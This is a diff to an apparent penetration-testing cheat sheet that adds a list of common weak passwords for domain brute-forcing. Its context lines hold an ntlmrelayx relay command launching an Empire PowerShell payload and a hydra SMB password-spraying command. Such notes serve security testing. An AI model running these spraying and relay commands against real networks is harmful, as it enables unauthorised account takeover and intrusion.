@@ -61,6 +61,18 @@ Use hashcat on a more powerful box. This is only for easy wins.
 `ntlmrelayx.py -tf targets.txt -c <insert Empire Powershell launcher>`
 
 ## Bruteforce domain passwords
+### Common Passwords
+
+$Company1
+$Season$Year
+Password1
+Password!
+Welcome1
+Welcome!
+P@55word
+P@55w0rd
+$month$year
+
 ### Using hydra
 
 `hydra -L users.txt -p Password1 -m 'D' 172.20.11.55 smbnt -V`
